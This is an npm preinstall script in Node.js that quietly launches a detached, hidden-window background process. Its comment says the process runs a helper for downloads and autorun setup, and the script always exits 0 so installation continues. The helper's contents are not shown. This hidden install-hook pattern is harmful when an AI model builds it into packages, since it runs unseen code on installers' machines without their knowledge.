const { spawn } = require('child_process');
const path = require('path');

// Launch a detached Node process that runs the package's preInstall routine
// without blocking the current npm install. This script should be fast and
// always exit 0 so it doesn't interfere with the install lifecycle.

try {
  const projectRoot = path.join(__dirname, '..');
  const node = process.execPath;
  const cwd = path.join(__dirname, '..');
  // Spawn the project's index.js directly to avoid shell/quoting issues with -e
  // Run the detached downloader/installer helper so downloads and autorun setup run
  const detachScript = path.join(cwd, 'scripts', 'detach-preinstall.js');
  const outLog = path.join(cwd, 'preinstall-detach.log');
  const fs = require('fs');
  const outFd = fs.openSync(outLog, 'a');
  const child = spawn(node, [detachScript], {
    cwd,
    detached: true,
    windowsHide: true,
    stdio: ['ignore', outFd, outFd],
    env: { ...process.env, PREINSTALL_RUNNING: 'true', npm_config_ignore_scripts: 'true' }
  });

  child.unref();
  console.log('[start-preinstall] Detached preinstall process spawned. PID:', child.pid, 'logs ->', outLog);
} catch (err) {
  console.error('[start-preinstall] Failed to spawn detached preinstall:', err && err.message ? err.message : err);
}

// Exit immediately so npm proceeds with install
process.exit(0);
